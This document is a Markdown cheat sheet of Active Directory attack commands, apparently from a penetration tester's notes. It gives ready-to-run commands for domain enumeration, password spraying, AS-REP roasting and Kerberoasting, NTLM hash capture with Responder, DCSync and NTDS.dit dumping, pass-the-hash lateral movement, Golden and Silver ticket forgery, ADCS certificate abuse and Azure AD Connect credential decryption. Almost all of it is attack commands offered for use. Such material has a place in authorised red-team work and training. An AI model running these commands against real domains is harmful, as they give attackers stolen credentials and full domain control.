# Active Directory Attacks Cheat Sheet

Command reference for AD enumeration and exploitation tools. For the
reasoning behind the overall attack chain, see
[Active Directory methodology](../methodology/active-directory.md).

## Enumeration

```cmd
:: Command Prompt
net user /domain ; net user <user> /domain
net group /domain ; net accounts /domain    :: password policy
net localgroup Administrators
```

```powershell
# Built-in ActiveDirectory module
Get-ADUser -Identity <user> -Server <domain> -Properties *
Get-ADGroupMember -Identity <group> -Server <domain>

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain ; Get-NetUser ; Get-NetGroup ; Get-NetComputer
Get-NetUser -SPN | select samaccountname,serviceprincipalname     # Kerberoastable
Get-DomainUser -PreauthNotRequired -verbose                         # AS-REP roastable
Find-LocalAdminAccess
Get-ObjectAcl -Identity <user>
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Find-DomainShare
```

```
AD permission types (know these cold):
GenericAll            — full control of the object
GenericWrite          — edit specific attributes (targeted Kerberoast, shadow creds)
WriteOwner             — change object ownership
WriteDACL              — edit the object's ACEs (e.g. grant yourself DCSync)
AllExtendedRights      — password reset, DCSync, etc.
ForceChangePassword    — reset the target's password
Self (Self-Membership) — add yourself to a group
```

### LDAP (raw)

```bash
ldapsearch -x -H ldap://<DC_IP> -s base                              # anonymous bind check
ldapsearch -x -H ldap://<DC_IP> -D '' -w '' -b "dc=<domain>,dc=<tld>" | grep -i password
ldapsearch -x -H ldap://<DC_IP> -b "dc=<domain>,dc=<tld>" "(objectClass=person)"

# lockout policy — always check before spraying
ldapsearch -x -H ldap://<DC_IP> -b "dc=<domain>,dc=<tld>" -s sub "*" | grep -i lock
```

### BloodHound

```bash
bloodhound-python -u <USER> -p '<PW>' -ns <DC_IP> -d <DOMAIN> -c all
# Windows target: Import-Module .\Sharphound.ps1 ; Invoke-BloodHound -CollectionMethod All
sudo bloodhound     # upload the resulting JSON files
```

Key queries: *Shortest Paths to Domain Admins*, *Find all Domain Admins*,
Node Info → Groups/LocalAdmin/Sessions, filters on `MemberOf`/`AdminTo`/
`HasSession`/`GenericAll`.

### GPP / cpassword

```bash
# Impacket
Get-GPPPassword.py -no-pass '<DC_IP>'                                 # null session
Get-GPPPassword.py '<DOMAIN>'/'<USER>':'<PW>'@'<DC_IP>'

# Or manually from a SYSVOL share
grep -inr "cpassword" <downloaded_sysvol_dir>
gpp-decrypt "<cpassword-blob>"

netexec smb <TARGET> -u <USER> -p <PW> -M gpp_password
```

## Password spraying / roasting

```bash
netexec smb <TARGET/RANGE> -u <USERS_LIST> -p '<PW>' --continue-on-success
kerbrute passwordspray -d <DOMAIN> <USERS_LIST> "<PASSWORD>"

# AS-REP Roasting (no creds needed — check first, never touches lockout)
impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_LIST> -dc-ip <DC_IP> -format hashcat -outputfile hashes.asreproast
.\Rubeus.exe asreproast /nowrap                                        # from a compromised Windows host
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt

# Kerberoasting (needs any valid domain account)
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>:<PW> -request
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

## Responder / relay

```bash
sudo responder -I <interface>
# captured: [SMBv2] NTLMv2-SSP Hash: <user>::<domain>:<hash>
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

## Credential dumping / DCSync

```bash
# From a compromised DC-reachable account with replication rights
impacket-secretsdump <DOMAIN>/<USER>:<PW>@<DC_IP>
impacket-secretsdump -just-dc-user <target_user> <DOMAIN>/<USER>:<PW>@<DC_IP>
impacket-secretsdump <DOMAIN>/<USER>:<PW>@<DC_IP> -just-dc-ntlm         # NTDS.dit

# Mimikatz
lsadump::dcsync /user:<DOMAIN>\<target_user>
lsadump::dcsync /user:<DOMAIN>\krbtgt

# Shadow copy method (local admin on the DC, no replication rights needed)
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

## Lateral movement — pass the hash / ticket

```bash
# Always pass the FULL hash (LM:NT) to these tools
impacket-psexec  -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET_IP>
impacket-wmiexec -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET_IP>
impacket-smbexec -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET_IP>
impacket-atexec  -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET_IP> <command>
evil-winrm -i <TARGET_IP> -u <USER> -H <NT_HASH>
```

```powershell
# wmic / winrs (need cleartext creds)
wmic /node:<TARGET_IP> /user:<USER> /password:<PW> process call create "<command>"
winrs -r:<TARGET_IP> -u:<USER> -p:<PW> "<command>"
```

```bash
# netexec (modern crackmapexec successor)
netexec smb <TARGET> -u <USER> -p <PW> --sam --lsa --dpapi --ntds     # chained dumps
netexec ldap <TARGET> -u <USER> -p <PW> --bloodhound --dns-server <DC_IP> -c all
netexec smb <TARGET> -u <USER> -p <PW> -M zerologon                  # vuln check
netexec smb <TARGET> -u <USER> -p <PW> -M spider_plus                # search shares for files
```

### Pass the ticket / Golden & Silver tickets (Mimikatz)

```powershell
# Golden ticket — needs krbtgt hash
lsadump::dcsync /user:krbtgt
kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt
misc::cmd

# Silver ticket — needs the target service account's NTLM hash + domain SID
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<service_host> /service:<spn_service> /rc4:<ntlm_hash> /user:<any_user>

# Pass the ticket from an exported .kirbi
sekurlsa::tickets /export
kerberos::ptt <file>.kirbi
```

## ADCS

```bash
certipy-ad find -u <USER>@<DOMAIN> -p '<PW>' -dc-ip <DC_IP> -vulnerable
certipy-ad shadow auto -u <USER>@<DOMAIN> -p '<PW>' -account <target_account>
certipy-ad req -u <USER> -hashes <RC4_HASH> -ca <CA_NAME> -template <TEMPLATE>
certipy-ad auth -dc-ip <DC_IP> -pfx <cert>.pfx -u <user> -domain <domain>
```

## Azure AD Connect credential extraction

When `Program Files\Microsoft Azure AD Sync` is present on a reachable host,
the sync account's credentials can be decrypted directly from the local
`ADSync` SQL database using the service's own crypto library:

```powershell
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=<HOST>;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
# ... query private_configuration_xml / encrypted_configuration from mms_management_agent,
# then decrypt using: add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
# (full script: search "AADInternals" or "Azure-ADConnect credential extraction")
```

## Impacket quick reference

```bash
lookupsid.py <DOMAIN>/<USER>:<PW>@<TARGET_IP>            # user enumeration
services.py <DOMAIN>/<USER>:<PW>@<TARGET_IP> <ACTION>     # service enum
GetUserSPNs.py <DOMAIN>/<USER>:<PW>@<TARGET_IP> -dc-ip <IP> -request
GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -usersfile <USERS_LIST> -format hashcat -outputfile hashes.txt
secretsdump.py <DOMAIN>/<USER>:<PW>@<TARGET_IP>
psexec.py / wmiexec.py / smbexec.py / atexec.py <DOMAIN>/<USER>:<PW>@<TARGET_IP>
```

## Evil-WinRM quick reference

```bash
evil-winrm -i <IP> -u <USER> -p '<PW>'
evil-winrm -i <IP> -u <USER> -p '<PW>' -S                 # port 5986 (TLS)
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
evil-winrm -i <IP> -c cert.pem -k key.pem -S               # certificate auth
# menu ; upload <f> ; download <f> ; Invoke-Binary <path/to/tool.exe>
```
